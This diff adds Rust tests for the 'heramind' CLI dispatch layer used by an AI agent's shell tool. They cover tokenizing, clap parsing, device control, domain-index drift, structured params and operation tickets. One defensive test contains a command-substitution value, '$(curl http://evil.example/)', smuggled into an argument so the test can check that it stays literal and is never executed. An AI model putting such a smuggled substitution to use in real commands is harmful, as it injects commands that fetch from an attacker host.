+        let cli_argv = tokenize_heramind_command(&cli_example).expect("CLI example must tokenize");
+
+        let mut parsed_params_json = serde_json::Value::Null;
+        let mut parsed_id = String::new();
+        let mut parsed_command = String::new();
+        for argv in [injected_argv, cli_argv] {
+            let parsed = Args::try_parse_from(argv.iter()).expect("example must clap-parse");
+            let Command::Device { device_cmd } = parsed.command else {
+                panic!("expected device command from shell_example");
+            };
+            let DeviceCommand::Control {
+                id,
+                command,
+                params: params_flag,
+                param,
+            } = device_cmd
+            else {
+                panic!("expected device control from shell_example");
+            };
+            assert!(
+                param.is_empty(),
+                "shell_example uses --params, not repeated --param"
+            );
+            let pj: serde_json::Value = serde_json::from_str(
+                params_flag
+                    .as_deref()
+                    .expect("--params must be present on shell_example"),
+            )
+            .expect("--params JSON");
+            assert_eq!(
+                pj["text"].as_str(),
+                Some(text),
+                "tokenizer+clap must preserve text byte/char-identical"
+            );
+            assert_eq!(id, "eink-nm254");
+            assert_eq!(command, "render_text");
+            parsed_params_json = pj;
+            parsed_id = id;
+            parsed_command = command;
+        }
+        let params_json = parsed_params_json;
+        let id = parsed_id;
+        let command = parsed_command;
+
+        struct RecordingAdapter {
+            sent: Arc<tokio::sync::Mutex<Vec<(String, String, String)>>>,
+        }
+        #[async_trait::async_trait]
+        impl DeviceAdapter for RecordingAdapter {
+            fn name(&self) -> &str {
+                "nm254-rec"
+            }
+            fn adapter_type(&self) -> &'static str {
+                "test"
+            }
+            fn is_running(&self) -> bool {
+                true
+            }
+            async fn start(&self) -> AdapterResult<()> {
+                Ok(())
+            }
+            async fn stop(&self) -> AdapterResult<()> {
+                Ok(())
+            }
+            fn subscribe(&self) -> Pin<Box<dyn Stream<Item = DeviceEvent> + Send + '_>> {
+                Box::pin(futures::stream::empty())
+            }
+            fn device_count(&self) -> usize {
+                0
+            }
+            fn list_devices(&self) -> Vec<String> {
+                Vec::new()
+            }
+            fn as_any(&self) -> &dyn std::any::Any {
+                self
+            }
+            async fn send_command(
+                &self,
+                device_id: &str,
+                command_name: &str,
+                payload: String,
+                _topic: Option<String>,
+            ) -> AdapterResult<()> {
+                self.sent.lock().await.push((
+                    device_id.to_string(),
+                    command_name.to_string(),
+                    payload,
+                ));
+                Ok(())
+            }
+            fn connection_status(&self) -> ConnectionStatus {
+                ConnectionStatus::Connected
+            }
+            async fn subscribe_device(&self, _device_id: &str) -> AdapterResult<()> {
+                Ok(())
+            }
+            async fn unsubscribe_device(&self, _device_id: &str) -> AdapterResult<()> {
+                Ok(())
+            }
+        }
+
+        let registry = Arc::new(DeviceRegistry::new());
+        let service = Arc::new(DeviceService::new(registry, EventBus::new()));
+        let template =
+            DeviceTypeTemplate::new("nm254_eink", "NM254 Eink").with_command(CommandDefinition {
+                name: "render_text".into(),
+                display_name: "Render Text".into(),
+                payload_template: r#"{"text":"${text}"}"#.into(),
+                parameters: vec![ParameterDefinition {
+                    name: "text".into(),
+                    display_name: "Text".into(),
+                    data_type: MetricDataType::String,
+                    unit: String::new(),
+                    min: None,
+                    max: None,
+                    default_value: None,
+                    allowed_values: vec![],
+                    required: true,
+                    visible_when: None,
+                    group: None,
+                    help_text: String::new(),
+                    validation: vec![],
+                }],
+                fixed_values: Default::default(),
+                samples: vec![],
+                description: String::new(),
+                parameter_groups: vec![],
+            });
+        service.register_template(template).await.unwrap();
+        service
+            .register_device(DeviceConfig {
+                device_id: id.clone(),
+                name: "NM254".into(),
+                device_type: "nm254_eink".into(),
+                adapter_type: "test".into(),
+                connection_config: ConnectionConfig::new(),
+                adapter_id: Some("nm254-rec".into()),
+                last_seen: 0,
+                offline_timeout_secs: None,
+            })
+            .await
+            .unwrap();
+        let adapter = Arc::new(RecordingAdapter {
+            sent: Arc::new(tokio::sync::Mutex::new(Vec::new())),
+        });
+        service
+            .register_adapter(
+                "nm254-rec".into(),
+                adapter.clone() as Arc<dyn DeviceAdapter>,
+            )
+            .await;
+
+        let mut send_params = std::collections::HashMap::new();
+        for (k, v) in params_json.as_object().unwrap() {
+            send_params.insert(k.clone(), v.clone());
+        }
+        service
+            .send_command(&id, &command, send_params)
+            .await
+            .expect("valid params from shell_example must reach the adapter");
+
+        let sent = adapter.sent.lock().await.clone();
+        assert_eq!(sent.len(), 1, "adapter must receive exactly once: {sent:?}");
+        assert_eq!(sent[0].0, id);
+        assert_eq!(sent[0].1, "render_text");
+        let payload: serde_json::Value = serde_json::from_str(&sent[0].2).expect("payload is JSON");
+        assert_eq!(
+            payload["text"].as_str(),
+            Some(text),
+            "adapter payload text must match shell_example params byte/char-identical"
+        );
+    }
+
+    #[test]
+    fn split_path_hint_targets_the_offending_argument() {
+        let case = |msg: &str, command: &str| {
+            should_hint_split_path(msg, &tokenize_heramind_command(command).unwrap())
+        };
+        let error = "unexpected argument 'Support/com.heramind.heramind/data/frontend-components/device-info-widget' found";
+        assert!(case(
+            error,
+            "heramind widget install /Users/x/Library/Application Support/com.heramind.heramind/data/frontend-components/device-info-widget",
+        ));
+        // Quotes around another argument do not repair the split path.
+        assert!(case(error,
+            "heramind widget install /Users/x/Library/Application Support/com.heramind.heramind/data/frontend-components/device-info-widget --label \"two words\""));
+        // Quoted and escaped paths remain a single parsed argument.
+        assert!(!case(error,
+            "heramind widget install \"/Users/x/Library/Application Support/com.heramind.heramind/data/frontend-components/device-info-widget\""));
+        assert!(!case(
+            error,
+            r"heramind widget install /Users/x/Library/Application\ Support/com.heramind.heramind/data/frontend-components/device-info-widget"
+        ));
+        for flag in ["--components", "--id", "--url"] {
+            assert!(!case(
+                &format!("unexpected argument '{flag}' found"),
+                &format!("heramind widget install /tmp/widget {flag} value"),
+            ));
+        }
+        assert!(!case(
+            "unexpected argument 'foo' found",
+            "heramind widget install /tmp/widget foo",
+        ));
+        assert!(!case(
+            "unexpected argument '/tmp/second' found",
+            "heramind widget install /tmp/first /tmp/second"
+        ));
+        assert!(!case(
+            "missing required arguments",
+            "heramind widget install"
+        ));
+    }
+
+    #[tokio::test]
+    async fn real_clap_errors_do_not_misdiagnose_unsupported_flags_as_paths() {
+        for command in [
+            "heramind dashboard update-component dash-1 --components '{}'",
+            "heramind transform update --id transform-1 --code 'return input'",
+            "heramind connector create --name test --url https://example.com",
+        ] {
+            let argv = tokenize_heramind_command(command).unwrap();
+            let error = heramind_cli_ops::dispatch::dispatch(&argv)
+                .await
+                .expect_err("invalid flags must remain rejected");
+            let heramind_cli_ops::dispatch::DispatchError::Parse(message) = error else {
+                panic!("expected clap parse failure for {command}");
+            };
+            assert!(message.contains("unexpected argument"), "{message}");
+            assert!(!should_hint_split_path(&message, &argv));
+        }
+        let argv = tokenize_heramind_command(
+            "heramind widget install /Users/x/Library/Application Support/widget",
+        )
+        .unwrap();
+        let heramind_cli_ops::dispatch::DispatchError::Parse(message) =
+            heramind_cli_ops::dispatch::dispatch(&argv)
+                .await
+                .expect_err("split path")
+        else {
+            panic!("expected split-path parse error");
+        };
+        assert!(should_hint_split_path(&message, &argv), "{message}");
+    }
 
     #[test]
     fn tokenizer_rejects_shell_constructs_outside_quotes() {
@@ -1879,6 +3647,35 @@ mod dispatch_edge_tests {
         // argument content, which clap receives intact.
         let toks = tokenize_heramind_command(r"message send 'a | b > c $d'").unwrap();
         assert_eq!(toks, ["message", "send", "a | b > c $d"]);
+    }
+
+    #[test]
+    fn readonly_list_models_quoted_subst_stays_literal_argv_not_shell() {
+        // Classifier: list-models is ProvenReadOnly. Tokenize keeps quoted
+        // `$(…)` literal. NotInProcess must spawn that argv — re-shelling the
+        // raw line would execute the substitution.
+        // Double-quoted `$()` survives tokenize as a literal arg; /bin/sh -c
+        // would expand it. Use r## so the closing `"#` of the endpoint does
+        // not terminate the Rust raw string.
+        let cmd = r##"heramind list-models --endpoint "$(curl http://evil.example/)""##;
+        let argv = tokenize_heramind_command(cmd).expect("quoted $() tokenizes");
+        assert_eq!(argv[0], "heramind");
+        assert_eq!(argv[1], "list-models");
+        assert!(
+            argv.iter()
+                .any(|a| a.contains("$(curl http://evil.example/)")),
+            "substitution must remain literal in argv: {argv:?}"
+        );
+        let cap = classify_shell_capability(cmd);
+        assert_eq!(
+            cap.retry_policy,
+            crate::agent::task_continuity::RetryPolicy::AlwaysSafe,
+            "list-models must classify as read-only"
+        );
+        assert!(
+            not_in_process_uses_parsed_argv(),
+            "NotInProcess after readonly classify must not re-interpret raw shell"
+        );
     }
 
     #[test]
@@ -1929,5 +3726,1611 @@ mod dispatch_edge_tests {
         assert_eq!(find_safe_truncation_point(s, 6), 6);
         assert_eq!(find_safe_truncation_point(s, 999), s.len());
         assert_eq!(find_safe_truncation_point("", 10), 0);
+    }
+
+    /// The domain index in the tool description must match the CLI it describes.
+    ///
+    /// That index is the model's map of what exists: `heramind <domain> --help`
+    /// gives flags, but this line decides which domains and subcommands it even
+    /// considers. Nothing compared the two, which is how `--auto-approve` stayed
+    /// in a skill after 8ec68e2c deleted the flag, and how a subcommand could be
+    /// renamed and simply vanish from the model's world.
+    #[test]
+    fn the_domain_index_lists_exactly_what_the_cli_has() {
+        use clap::CommandFactory;
+
+        let root = heramind_cli_ops::dispatch::commands::Args::command();
+        let mut problems: Vec<String> = Vec::new();
+        let mut domains_seen = 0usize;
+
+        for line in DOMAIN_INDEX.lines() {
+            let Some(rest) = line.strip_prefix("- ") else {
+                continue;
+            };
+            let Some((domain, listed)) = rest.split_once(": ") else {
+                continue;
+            };
+            let Some(cmd) = root.get_subcommands().find(|c| c.get_name() == domain) else {
+                problems.push(format!(
+                    "`{domain}` is listed but the CLI has no such domain"
+                ));
+                continue;
+            };
+            domains_seen += 1;
+
+            // The line is `- <domain>: a b c — <sub>: d e`, where the part after
+            // the em dash names a nested group's own subcommands. Check each
+            // level against the level it belongs to.
+            // Strip parenthetical asides FIRST: a connector line's aside contains
+            // its own em dash and colon, and splitting before removing it turned
+            // "MQTT broker / webhook / HTTP — NOT devices" into a nested group.
+            let listed = listed.split('(').next().unwrap_or(listed);
+            let segments: Vec<&str> = listed.split('—').map(str::trim).collect();
+            for (level, segment) in segments.iter().enumerate() {
+                let (parent, names) = match segment.split_once(':') {
+                    Some((sub, names)) => (sub.trim(), names),
+                    None => (domain, *segment),
+                };
+                let owner = if level == 0 {
+                    cmd
+                } else {
+                    match cmd.get_subcommands().find(|c| c.get_name() == parent) {
+                        Some(c) => c,
+                        None => {
+                            problems
+                                .push(format!("`{domain} {parent}` is named but does not exist"));
+                            continue;
+                        }
+                    }
+                };
+                let real_here: std::collections::BTreeSet<&str> =
+                    owner.get_subcommands().map(|c| c.get_name()).collect();
+                // `<ID>` and friends are arguments, not commands.
+                let named: std::collections::BTreeSet<&str> = names
+                    .split_whitespace()
+                    .filter(|t| {
+                        !t.starts_with('<')
+                            && !t.starts_with('`')
+                            && t.chars().all(|c| c.is_ascii_lowercase() || c == '-')
+                    })
+                    .collect();
+                let where_ = if level == 0 {
+                    domain.to_string()
+                } else {
+                    format!("{domain} {parent}")
+                };
+                for ghost in named.difference(&real_here) {
+                    problems.push(format!("`{where_} {ghost}` is listed but does not exist"));
+                }
+                for missing in real_here.difference(&named) {
+                    problems.push(format!(
+                        "`{where_} {missing}` exists but is not in the index, so the model \
+                         will not know to use it"
+                    ));
+                }
+            }
+        }
+
+        // The other direction: a whole domain the model never learns about. The
+        // index carries its own exclusion list — commands that only run as a
+        // separate process, or that an agent must not run at all — so this also
+        // checks that a domain is either offered or explicitly ruled out.
+        let indexed: std::collections::BTreeSet<&str> = DOMAIN_INDEX
+            .lines()
+            .filter_map(|l| l.strip_prefix("- "))
+            .filter_map(|l| l.split(':').next())
+            .collect();
+        let excluded: std::collections::BTreeSet<&str> = DOMAIN_INDEX
+            .split("Deliberately not available here")
+            .nth(1)
+            .and_then(|rest| rest.split('—').next())
+            .unwrap_or("")
+            .split_whitespace()
+            .collect();
+        for cmd in root.get_subcommands() {
+            let name = cmd.get_name();
+            if name == "help" || indexed.contains(name) || excluded.contains(name) {
+                continue;
+            }
+            problems.push(format!(
+                "domain `{name}` is neither in the index nor in the exclusion list — the model \
+                 has no way to know whether it can use it"
+            ));
+        }
+
+        assert!(
+            domains_seen > 8,
+            "parsed only {domains_seen} domains — the scan is broken"
+        );
+        assert!(
+            problems.is_empty(),
+            "domain index drift:\n  {}",
+            problems.join("\n  ")
+        );
+    }
+
+    /// Platform message center vs device control must stay distinct in the index.
+    ///
+    /// Models otherwise treat `message send` as "put text on this device" (e.g.
+    /// `@INK 发送一段文本`). The aside must steer them to `device get` →
+    /// `device control` for any device, and keep the agents note.
+    #[test]
+    fn message_index_steers_device_actions_to_device_control() {
+        let message_line = DOMAIN_INDEX
+            .lines()
+            .find(|l| l.starts_with("- message:"))
+            .expect("message domain line");
+        assert!(message_line.contains("`message send` creates a platform message"));
+        assert!(message_line.contains("NOT for talking to agents"));
+        assert!(message_line.contains("device get <id>"));
+        assert!(message_line.contains("device control <id> <command>"));
+        assert!(
+            !message_line.to_ascii_lowercase().contains("eink"),
+            "device routing must stay device-generic, not e-ink-specific"
+        );
+    }
+
+    /// NM-249: domain index footer is a cheat sheet, not a completeness claim.
+    #[test]
+    fn nm249_domain_index_footer_is_cheat_sheet() {
+        assert!(DOMAIN_INDEX.contains("common cheat sheet"));
+        assert!(DOMAIN_INDEX.contains("full flags and aliases"));
+        assert!(!DOMAIN_INDEX.contains("Anything not listed above does not exist"));
+    }
+
+    /// NM-252: overview via list; concrete task via `--search` + shell_example;
+    /// no residual sanitized-name example.
+    #[test]
+    fn nm249_extension_selection_rules_in_description() {
+        let tool = ShellTool::new(ShellConfig::default());
+        let d = tool.description();
+        assert!(d.contains("extension list"));
+        assert!(d.contains("extension commands --search"));
+        assert!(d.contains("shell_example"));
+        assert!(d.contains("extension commands <ID>"));
+        assert!(!d.contains("weather-forecast-v2_get_weather"));
+        assert!(!d.contains("--params '{...}'"));
+    }
+
+    /// Every `heramind ...` command the builtin skills show the model must parse.
+    ///
+    /// The skills are what the model copies from. `25a908f5` fixed five examples
+    /// whose syntax had drifted from the real commands — each had been steering
+    /// a retry into a second failure — and nothing was comparing them, so this
+    /// does: pull the command lines out of the fenced blocks and hand them to
+    /// the same clap definition the CLI runs.
+    ///
+    /// Lines the in-process tokenizer refuses (pipes, redirections, `$`,
+    /// backticks) are real shell lines, not `heramind` invocations, and are
+    /// skipped by the same rule the runtime uses.
+    #[test]
+    fn every_command_the_skills_show_the_model_parses() {
+        use clap::Parser;
+
+        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src/skills/builtins");
+        let mut checked = 0usize;
+        let mut failures: Vec<String> = Vec::new();
+
+        let mut files: Vec<_> = std::fs::read_dir(&dir)
+            .expect("skills dir")
+            .filter_map(|e| e.ok().map(|e| e.path()))
+            .filter(|p| p.extension().is_some_and(|x| x == "md"))
+            .collect();
+        files.sort();
+
+        for path in files {
+            let skill = path.file_stem().unwrap().to_string_lossy().to_string();
+            let text = std::fs::read_to_string(&path).expect("read skill");
+            let lines: Vec<&str> = text.lines().collect();
+            let mut i = 0usize;
+            while i < lines.len() {
+                let start_line = i + 1;
+                // A recipe may be wrapped: `heramind agent create \` and the
+                // flags on the following lines. Join them back into one.
+                let mut full = String::new();
+                loop {
+                    let piece = lines[i].trim();
+                    let continues = piece.ends_with('\\');
+                    let piece = piece.trim_end_matches('\\').trim();
+                    if full.is_empty() {
+                        full.push_str(piece);
+                    } else {
+                        full.push(' ');
+                        full.push_str(piece);
+                    }
+                    i += 1;
+                    if !continues || i >= lines.len() {
+                        break;
+                    }
+                }
+                // Drop a trailing `# comment`, but only when the `#` is outside
+                // quotes — a `#` inside a prompt is text.
+                if let Some(at) = full.find(" #") {
+                    if full[..at].matches('"').count().is_multiple_of(2) {
+                        full.truncate(at);
+                    }
+                }
+                let full = full.trim().to_string();
+                if !full.starts_with("heramind ") {
+                    continue;
+                }
+                if full.contains('<') || full.contains("...") || full.contains("heramind x") {
+                    continue;
+                }
+                let Ok(argv) = tokenize_heramind_command(&full) else {
+                    continue; // a shell line, by the runtime's own rule
+                };
+                checked += 1;
+                if let Err(e) = heramind_cli_ops::dispatch::commands::Args::try_parse_from(&argv) {
+                    failures.push(format!("{skill}.md:{start_line}  {full}\n      -> {e}"));
+                }
+            }
+        }
+
+        assert!(
+            checked > 50,
+            "only found {checked} commands — the scan is not reading the skills"
+        );
+        assert!(
+            failures.is_empty(),
+            "{} skill example(s) do not parse:\n{}",
+            failures.len(),
+            failures.join("\n")
+        );
+    }
+}
+#[cfg(test)]
+mod nm247_structured_params_tests {
+    use super::{
+        bind_extension_invoke_prepared_token, classify_shell_capability_with_args,
+        extension_invoke_host_context_from_args, inject_structured_json_argv,
+        strip_host_meta_from_argv, validate_extension_params_sources,
+    };
+    use heramind_core::extension::{
+        begin_instance_generation, classify_and_bind_chat_invoke, invalidate_instance_capability,
+        CommandEffect, ExtensionCommand, ExtensionCommandSnapshot, MetricDataType,
+        ParameterDefinition,
+    };
+    use serde_json::json;
+
+    fn publish(id: &str) {
+        invalidate_instance_capability(id);
+        let gen = begin_instance_generation(id);
+        let get = ExtensionCommand {
+            name: "get_weather".into(),
+            display_name: "Get Weather".into(),
+            description: "Query weather".into(),
+            parameters: vec![ParameterDefinition {
+                name: "city".into(),
+                display_name: "City".into(),
+                description: "City name".into(),
+                param_type: MetricDataType::String,
+                required: true,
+                default_value: None,
+                min: None,
+                max: None,
+                options: vec![],
+            }],
+            effect: Some(CommandEffect::ReadOnly),
+            replay_safety: None,
+            execution: None,
+            ..Default::default()
+        };
+        ExtensionCommandSnapshot::build(id, "2.14.0", None, vec![get], gen)
+            .publish_capabilities()
+            .unwrap();
+    }
+
+    #[test]
+    fn strip_host_meta_drops_new_operation_and_prepared_tokens() {
+        let argv = vec![
+            "heramind".into(),
+            "dashboard".into(),
+            "update-component".into(),
+            "d1".into(),
+            "--component-id".into(),
+            "c1".into(),
+            "--set".into(),
+            r#"{"position":{"w":2,"h":2}}"#.into(),
+            "_new_operation=true".into(),
+            "--prepared-operation-id".into(),
+            "op_dead".into(),
+        ];
+        let cleaned = strip_host_meta_from_argv(argv);
+        assert_eq!(
+            cleaned,
+            vec![
+                "heramind",
+                "dashboard",
+                "update-component",
+                "d1",
+                "--component-id",
+                "c1",
+                "--set",
+                r#"{"position":{"w":2,"h":2}}"#,
+            ]
+        );
+    }
+
+    #[test]
+    fn conflict_params_object_and_set_flag_rejected_for_dashboard() {
+        let args = json!({
+            "command": "heramind dashboard update-component d1 --component-id c1 --set {\"w\":2}",
+            "params": {"position":{"w":2,"h":2}}
+        });
+        let err = validate_extension_params_sources(&args).unwrap_err();
+        assert!(err.contains("conflict"), "{err}");
+        assert!(err.contains("--set"), "{err}");
+    }
+
+    #[test]
+    fn conflict_params_object_and_cli_flag_rejected() {
+        let args = json!({
+            "command": "heramind extension invoke weather-forecast-v2 get_weather --params {\"city\":\"Xiamen\"}",
+            "params": {"city": "Xiamen"}
+        });
+        let err = validate_extension_params_sources(&args).unwrap_err();
+        assert!(err.contains("conflict"), "{err}");
+    }
+
+    #[test]
+    fn non_object_params_rejected() {
+        let args = json!({
+            "command": "heramind extension invoke weather-forecast-v2 get_weather",
+            "params": "Xiamen"
+        });
+        let err = validate_extension_params_sources(&args).unwrap_err();
+        assert!(err.contains("object"), "{err}");
+    }
+
+    #[test]
+    fn non_extension_shell_ignores_params_field() {
+        let args = json!({
+            "command": "heramind device list",
+            "params": {"city": "Xiamen"}
+        });
+        assert!(validate_extension_params_sources(&args).is_ok());
+    }
+
+    #[tokio::test]
+    async fn array_params_accepted_and_injected_for_dashboard_array_flags() {
+        let add_args = json!({
+            "command": "heramind dashboard add-components d1",
+            "params": [{"id": "c1", "type": "value-card", "position": {"x":0,"y":0,"w":4,"h":2}}]
+        });
+        validate_extension_params_sources(&add_args)
+            .expect("array params must be accepted for dashboard add-components");
+
+        let rem_args = json!({
+            "command": "heramind dashboard remove-components d1",
+            "params": ["c1", "c2"]
+        });
+        validate_extension_params_sources(&rem_args)
+            .expect("array params must be accepted for dashboard remove-components");
+
+        // Wrong container kind must be rejected cleanly.
+        let wrong_obj_for_add = json!({
+            "command": "heramind dashboard add-components d1",
+            "params": {"id": "c1"}
+        });
+        let err = validate_extension_params_sources(&wrong_obj_for_add).unwrap_err();
+        assert!(err.contains("array"), "{err}");
+
+        let wrong_arr_for_set = json!({
+            "command": "heramind dashboard update-component d1 --component-id c1",
+            "params": ["c1"]
+        });
+        let err = validate_extension_params_sources(&wrong_arr_for_set).unwrap_err();
+        assert!(err.contains("object"), "{err}");
+
+        // Host context + argv injection preserves array JSON cleanly.
+        let ctx = extension_invoke_host_context_from_args(&rem_args).expect("host ctx");
+        let argv = vec![
+            "heramind".into(),
+            "dashboard".into(),
+            "remove-components".into(),
+            "d1".into(),
+        ];
+        let out = heramind_cli_ops::dispatch::with_extension_invoke_host_context(ctx, async {
+            inject_structured_json_argv(argv)
+        })
+        .await
+        .expect("inject array params");
+        assert_eq!(
+            out,
+            vec![
+                "heramind",
+                "dashboard",
+                "remove-components",
+                "d1",
+                "--ids",
+                r#"["c1","c2"]"#,
+            ]
+        );
+    }
+
+    #[test]
+    fn classify_shell_strips_host_meta_and_respects_structured_params() {
+        // Read-only query with leaked _new_operation inside command must stay read_query
+        // (never downgraded to mutating_unknown_sensitive).
+        let cap = classify_shell_capability_with_args(
+            "heramind device get cam-1 _new_operation=true",
+            &json!({}),
+        );
+        assert!(
+            cap.read_only,
+            "leaked _new_operation must not downgrade RO: {cap:?}"
+        );
+
+        let cap_logs = classify_shell_capability_with_args(
+            "heramind extension logs weather-forecast-v2 --_new_operation",
+            &json!({}),
+        );
+        assert!(
+            cap_logs.read_only,
+            "extension logs must be RO: {cap_logs:?}"
+        );
+
+        let cap_push_logs =
+            classify_shell_capability_with_args("heramind push logs p1 --limit 10", &json!({}));
+        assert!(
+            cap_push_logs.read_only,
+            "push logs must be RO: {cap_push_logs:?}"
+        );
+
+        // extension config without --set/params is read-only; WITH structured params is Mutating.
+        let cfg_read = classify_shell_capability_with_args(
+            "heramind extension config weather-forecast-v2",
+            &json!({}),
+        );
+        assert!(
+            cfg_read.read_only,
+            "extension config read must be RO: {cfg_read:?}"
+        );
+
+        let cfg_write = classify_shell_capability_with_args(
+            "heramind extension config weather-forecast-v2",
+            &json!({"params": {"city": "Beijing"}}),
+        );
+        assert!(
+            !cfg_write.read_only,
+            "extension config with params must be Mutating: {cfg_write:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn host_ticket_bind_without_argv_token() {
+        let id = "weather-nm247-host-ticket";
+        publish(id);
+        let params = json!({"city": "Xiamen"});
+        let bind = classify_and_bind_chat_invoke(id, "get_weather", &params);
+        let op = bind.prepared_operation_id.expect("ticket");
+        let argv = vec![
+            "heramind".into(),
+            "extension".into(),
+            "invoke".into(),
+            id.into(),
+            "get_weather".into(),
+        ];
+        heramind_cli_ops::dispatch::with_extension_invoke_host_context(
+            heramind_cli_ops::dispatch::ExtensionInvokeHostContext {
+                prepared_operation_id: Some(op),
+                structured_params: Some(params),
+                ..Default::default()
+            },
+            async {
+                bind_extension_invoke_prepared_token(argv).expect("host ticket must bind");
+            },
+        )
+        .await;
+        invalidate_instance_capability(id);
+    }
+
+    #[tokio::test]
+    async fn invented_argv_token_ignored_when_host_ticket_present() {
+        let id = "weather-nm247-host-wins";
+        publish(id);
+        let params = json!({"city": "Beijing"});
+        let bind = classify_and_bind_chat_invoke(id, "get_weather", &params);
+        let op = bind.prepared_operation_id.expect("ticket");
+        let argv = vec![
+            "heramind".into(),
+            "extension".into(),
+            "invoke".into(),
+            id.into(),
+            "get_weather".into(),
+            "--prepared-operation-id".into(),
+            "op_fresh_weather_2026".into(),
+        ];
+        heramind_cli_ops::dispatch::with_extension_invoke_host_context(
+            heramind_cli_ops::dispatch::ExtensionInvokeHostContext {
+                prepared_operation_id: Some(op),
+                structured_params: Some(params),
+                ..Default::default()
+            },
+            async {
+                bind_extension_invoke_prepared_token(argv).expect("host wins over invented token");
+            },
+        )
+        .await;
+        invalidate_instance_capability(id);
+    }
+
+    /// Case-c: attach mints ticket → canonicalize strips for fp → restore →
+    /// host context → bind claims (no PreparedInvoke missing).
+    #[tokio::test]
+    async fn case_c_followup_ticket_survives_execute_canonicalize() {
+        let id = "weather-nm247-case-c";
+        publish(id);
+        let params = json!({"city": "上海"});
+        let bind = classify_and_bind_chat_invoke(id, "get_weather", &params);
+        let op = bind.prepared_operation_id.expect("classify must mint");
+        let mut args = json!({
+            "command": format!(
+                "heramind extension invoke {id} get_weather --params '{{\"city\":\"上海\"}}'"
+            ),
+            crate::agent::task_continuity::HOST_PREPARED_OPERATION_ARG: op.clone(),
+        });
+        // Simulate execute_with_retry_impl canonicalize + restore.
+        let mut canon = crate::agent::task_continuity::canonicalize_tool_arguments("shell", &args);
+        crate::agent::task_continuity::restore_host_prepared_carriage(&args, &mut canon);
+        args = canon;
+        let argv = vec![
+            "heramind".into(),
+            "extension".into(),
+            "invoke".into(),
+            id.into(),
+            "get_weather".into(),
+            "--params".into(),
+            r#"{"city":"上海"}"#.into(),
+        ];
+        heramind_cli_ops::dispatch::with_extension_invoke_host_context(
+            heramind_cli_ops::dispatch::ExtensionInvokeHostContext {
+                prepared_operation_id: args
+                    .get(crate::agent::task_continuity::HOST_PREPARED_OPERATION_ARG)
+                    .and_then(|v| v.as_str())
+                    .map(str::to_string),
+                structured_params: Some(params),
+                ..Default::default()
+            },
+            async {
+                bind_extension_invoke_prepared_token(argv)
+                    .expect("restored host ticket must claim once");
+            },
+        )
+        .await;
+        // Second claim of same id must fail (single-claim).
+        let err = heramind_core::extension::claim_prepared_by_id(&op).unwrap_err();
+        assert!(
+            err.contains("already claimed") || err.contains("consumed"),
+            "ticket must be claimed exactly once: {err}"
+        );
+        invalidate_instance_capability(id);
+    }
+
+    /// NM-302: illegal unquoted-style params that stay non-JSON after tokenize
+    /// must attach-fail observably (HOST_ATTACH_ERROR), not silent no-ticket.
+    #[test]
+    fn attach_illegal_params_sets_host_attach_error_not_silent() {
+        let mut args = json!({
+            "command": "heramind extension invoke weather-forecast-v2 get_weather --params {city:xiamen}"
+        });
+        let cap = crate::agent::task_continuity::attach_chat_prepared_invoke("shell", &mut args);
+        assert!(
+            cap.prepared_operation_id.is_none(),
+            "illegal params must not mint a ticket: {cap:?}"
+        );
+        let err = args
+            .get(crate::agent::task_continuity::HOST_ATTACH_ERROR_ARG)
+            .and_then(|v| v.as_str())
+            .expect("attach must record HOST_ATTACH_ERROR_ARG");
+        assert!(
+            err.contains("could not parse invoke params"),
+            "attach error must be params guidance: {err}"
+        );
+        assert!(
+            err.contains("params") || err.contains("Preferred"),
+            "must prefer structured params tip: {err}"
+        );
+    }
+
+    /// NM-302 P1: bare `--params {"city":"xiamen"}` tokenizes to legal JSON → mint.
+    #[test]
+    fn attach_bare_params_json_mints_ticket() {
+        let id = "weather-nm302-bare-params";
+        publish(id);
+        let mut args = json!({
+            "command": format!(
+                "heramind extension invoke {id} get_weather --params {{\"city\":\"xiamen\"}}"
+            )
+        });
+        let cap = crate::agent::task_continuity::attach_chat_prepared_invoke("shell", &mut args);
+        let op = cap
+            .prepared_operation_id
+            .expect("bare quoted-inside JSON must mint");
+        assert_eq!(
+            args.get(crate::agent::task_continuity::HOST_PREPARED_OPERATION_ARG)
+                .and_then(|v| v.as_str()),
+            Some(op.as_str())
+        );
+        assert!(args
+            .get(crate::agent::task_continuity::HOST_ATTACH_ERROR_ARG)
+            .is_none());
+        invalidate_instance_capability(id);
+    }
+
+    /// NM-302: structured shell `params` mints → canonicalize strip → restore → bind.
+    #[tokio::test]
+    async fn attach_structured_params_mint_restore_bind() {
+        let id = "weather-nm302-structured";
+        publish(id);
+        let mut args = json!({
+            "command": format!("heramind extension invoke {id} get_weather"),
+            "params": {"city": "xiamen"}
+        });
+        let cap = crate::agent::task_continuity::attach_chat_prepared_invoke("shell", &mut args);
+        let op = cap
+            .prepared_operation_id
+            .expect("structured params must mint");
+        let mut canon = crate::agent::task_continuity::canonicalize_tool_arguments("shell", &args);
+        assert!(canon
+            .get(crate::agent::task_continuity::HOST_PREPARED_OPERATION_ARG)
+            .is_none());
+        crate::agent::task_continuity::restore_host_prepared_carriage(&args, &mut canon);
+        assert_eq!(
+            canon
+                .get(crate::agent::task_continuity::HOST_PREPARED_OPERATION_ARG)
+                .and_then(|v| v.as_str()),
+            Some(op.as_str())
+        );
+        let argv = vec![
+            "heramind".into(),
+            "extension".into(),
+            "invoke".into(),
+            id.into(),
+            "get_weather".into(),
+        ];
+        let ctx = extension_invoke_host_context_from_args(&canon).expect("host ctx");
+        heramind_cli_ops::dispatch::with_extension_invoke_host_context(ctx, async {
+            bind_extension_invoke_prepared_token(argv).expect("restored ticket must bind");
+        })
+        .await;
+        invalidate_instance_capability(id);
+    }
+
+    #[test]
+    fn transport_connect_refuse_is_not_submitted() {
+        let msg = "http_connect: error sending request for url (http://localhost:9375/api/extensions/weather/invoke): connection refused";
+        let out = super::classify_extension_transport_error(msg);
+        assert!(out.contains("not submitted"), "{out}");
+        assert!(out.contains("not reached"), "{out}");
+        assert!(!out.contains("result unknown"), "{out}");
+    }
+
+    #[test]
+    fn transport_timeout_is_result_unknown_no_auto_resend() {
+        let msg = "http_timeout: error sending request for url (http://localhost:9375/api/extensions/weather/invoke): operation timed out";
+        let out = super::classify_extension_transport_error(msg);
+        assert!(out.contains("result unknown"), "{out}");
+        assert!(!out.contains("not reached"), "{out}");
+        assert!(!out.contains("not submitted"), "{out}");
+        assert!(out.contains("do not auto-resend"), "{out}");
+        assert!(out.contains("ledger"), "{out}");
+    }
+}
+
+/// NM-240: shell bind carries classify-time id; no params FIFO claim.
+#[cfg(test)]
